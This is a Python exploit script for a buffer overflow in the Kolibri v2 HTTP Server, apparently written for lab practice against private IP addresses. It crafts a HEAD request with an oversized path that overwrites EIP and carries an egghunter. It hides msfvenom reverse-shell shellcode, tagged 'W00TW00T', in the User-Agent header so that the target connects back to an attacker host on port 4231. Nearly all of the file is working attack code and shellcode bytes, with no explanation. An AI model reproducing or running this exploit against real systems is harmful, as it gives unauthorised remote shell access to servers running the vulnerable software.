#!/etc/python
#Created by: Jb05s
#Purpose: Kolibri v2 HTTP Server - EggHunter

import socket, sys, os, struct

host = "10.0.0.9"
port = 8080

nops = struct.pack('<L', 0x90909090) * 4

"""
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.6 LPORT=4231 -f c -b \x00\x0A\x0D\x3D\x20\x3F
Payload size: 351 bytes
"""

sc = ("W00TW00T" + "\xbb\xc7\x55\x2c\xac\xd9\xeb\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
"\x52\x31\x5a\x12\x83\xc2\x04\x03\x9d\x5b\xce\x59\xdd\x8c\x8c"
"\xa2\x1d\x4d\xf1\x2b\xf8\x7c\x31\x4f\x89\x2f\x81\x1b\xdf\xc3"
"\x6a\x49\xcb\x50\x1e\x46\xfc\xd1\x95\xb0\x33\xe1\x86\x81\x52"
"\x61\xd5\xd5\xb4\x58\x16\x28\xb5\x9d\x4b\xc1\xe7\x76\x07\x74"
"\x17\xf2\x5d\x45\x9c\x48\x73\xcd\x41\x18\x72\xfc\xd4\x12\x2d"
"\xde\xd7\xf7\x45\x57\xcf\x14\x63\x21\x64\xee\x1f\xb0\xac\x3e"
"\xdf\x1f\x91\x8e\x12\x61\xd6\x29\xcd\x14\x2e\x4a\x70\x2f\xf5"
"\x30\xae\xba\xed\x93\x25\x1c\xc9\x22\xe9\xfb\x9a\x29\x46\x8f"
"\xc4\x2d\x59\x5c\x7f\x49\xd2\x63\xaf\xdb\xa0\x47\x6b\x87\x73"
"\xe9\x2a\x6d\xd5\x16\x2c\xce\x8a\xb2\x27\xe3\xdf\xce\x6a\x6c"
"\x13\xe3\x94\x6c\x3b\x74\xe7\x5e\xe4\x2e\x6f\xd3\x6d\xe9\x68"
"\x14\x44\x4d\xe6\xeb\x67\xae\x2f\x28\x33\xfe\x47\x99\x3c\x95"
"\x97\x26\xe9\x3a\xc7\x88\x42\xfb\xb7\x68\x33\x93\xdd\x66\x6c"
"\x83\xde\xac\x05\x2e\x25\x27\xaa\xa5\x24\xdc\xc2\xbb\x26\x32"
"\x94\x35\xc0\x58\x8a\x13\x5b\xf5\x33\x3e\x17\x64\xbb\x94\x52"
"\xa6\x37\x1b\xa3\x69\xb0\x56\xb7\x1e\x30\x2d\xe5\x89\x4f\x9b"
"\x81\x56\xdd\x40\x51\x10\xfe\xde\x06\x75\x30\x17\xc2\x6b\x6b"
"\x81\xf0\x71\xed\xea\xb0\xad\xce\xf5\x39\x23\x6a\xd2\x29\xfd"
"\x73\x5e\x1d\x51\x22\x08\xcb\x17\x9c\xfa\xa5\xc1\x73\x55\x21"
"\x97\xbf\x66\x37\x98\x95\x10\xd7\x29\x40\x65\xe8\x86\x04\x61"
"\x91\xfa\xb4\x8e\x48\xbf\xc5\xc4\xd0\x96\x4d\x81\x81\xaa\x13"
"\x32\x7c\xe8\x2d\xb1\x74\x91\xc9\xa9\xfd\x94\x96\x6d\xee\xe4"
"\x87\x1b\x10\x5a\xa7\x09")

egg = ("\x66\x81\xca\xff\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
"\xef\xb8\x57\x30\x30\x54\x89\xd7"
"\xaf\x75\xea\xaf\x75\xe7\xff\xe7")

pre = "\x41" * 515
eip = struct.pack('<L', 0x7C91FCD8)
pad = "\x43" * (600 - len(pre + eip + egg))

buffer = pre + eip + egg + pad
code = nops + sc

exploit = (
"HEAD /" + buffer + " HTTP/1.1\r\n"
"Host: 10.0.0.9:8080\r\n"
"User-Agent: " + code + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

jb05s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
jb05s.connect((host, port))
jb05s.send(exploit)
jb05s.close()
